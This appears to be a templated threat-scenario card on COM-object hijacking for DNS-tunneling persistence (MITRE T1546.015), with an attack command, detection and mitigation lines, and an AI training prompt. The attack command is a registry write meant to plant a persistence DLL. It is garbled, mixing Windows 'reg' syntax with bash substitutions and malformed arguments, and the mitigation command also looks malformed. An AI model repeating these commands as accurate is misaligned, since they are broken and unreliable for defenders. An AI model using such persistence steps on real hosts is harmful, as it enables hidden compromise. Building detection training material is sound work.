---
type: campaign
scenario_id: 403
tactic: Persistence
technique: "T1546.015: Component Object Model Hijacking"
technique_id: T1546.015
tags: [campaign, lotl, persistence]
---

# Hijacking COM object for DNS tunneling persistence.

## Threat Description
Hijacking COM object for DNS tunneling persistence.

## Attack Command
```
reg add HKLM\Software\Classes\CLSID\{$(uuidgen)} /v InprocServer32 /t REG_SZ /d "C:\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)" /f
```

## Detection Logic
Monitor COM registry: `reg query HKLM\Software\Classes\CLSID | findstr dnstunnel`; Event ID 4657.

## Mitigation
Restrict COM writes: `regini -h deny HKLM\Software\Classes\CLSID`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.

## AI Training Prompt
Train AI to detect COM hijacking for DNS tunneling persistence by analyzing CLSID registry changes, DLL paths, and DNS query patterns; suggest registry protections.

## References
- MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
